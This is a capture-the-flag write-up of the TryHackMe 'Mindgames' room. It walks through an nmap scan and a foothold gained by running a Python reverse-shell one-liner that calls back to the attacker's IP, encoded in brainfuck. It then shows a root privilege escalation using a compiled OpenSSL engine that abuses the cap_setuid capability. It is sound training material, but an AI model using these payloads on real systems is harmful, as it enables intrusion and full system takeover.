---
title: "TryHackMe - Mindgames"
author: Nasrallah
description: ""
date: 2023-01-11 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, brainfuck, capability]
img_path: /assets/img/tryhackme/mindgames
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Mindgames](https://tryhackme.com/room/mindgames) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.186.235                                                                                                                            
Host is up (0.13s latency).                                                                                                                                   
Not shown: 998 closed tcp ports (reset)                                                                                                                       
PORT   STATE SERVICE VERSION                                                                                                                                  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                             
| ssh-hostkey:                                                                                                                                                
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)                                                                                                
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)                                                                                               
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)                                                                                             
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                
|_http-title: Mindgames.                                                                                                                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

We found two ports, 22/tcp running OpenSSH and 80/tcp running a Goland http server.

### Web

Let's navigate to the web page.

![](1.png)

In this page we see some weird text, from my experience i can tell it's brainfuck programming language.

At the bottom of the page we find a section where we can execute brainfuck code.

![](2.png)

## **Foothold**

We can use this feature to give the page a reverse shell code in brainfuck and get a foothold.

We can use [dcode.fr](https://www.dcode.fr/brainfuck-language) to switch a python reverse shell code to brainfuck code.

I tried multiple python scripts but the following script is the one that worked for me.

```python
import os,pty,socket;s=socket.socket();s.connect(("10.11.14.124",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

![](3.png)

Now setup a listener and run the reverse shell on the web page.

![](4.png)

## **Privilege Escalation**

After we the shell, i run linpeas and found the following:

![](5.png)

We found `openssl` with the capability `cap_setuid+ep`.

I googled that and found this [article](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/) walking through how to exploit this capability to escalate privileges.

First we create a .c file with the following content.

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Now we compile the c code using the following commands:

 - `gcc -fPIC -o exploit.o -c exploit.c`

 - `gcc -shared -o exploit.so -lcrypto exploit.o`


Next we upload the `exploit.so` to our target machine.

![](6.png)

We run the command `openssl req -engine ./exploit.so` to get a root shell.

![](7.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
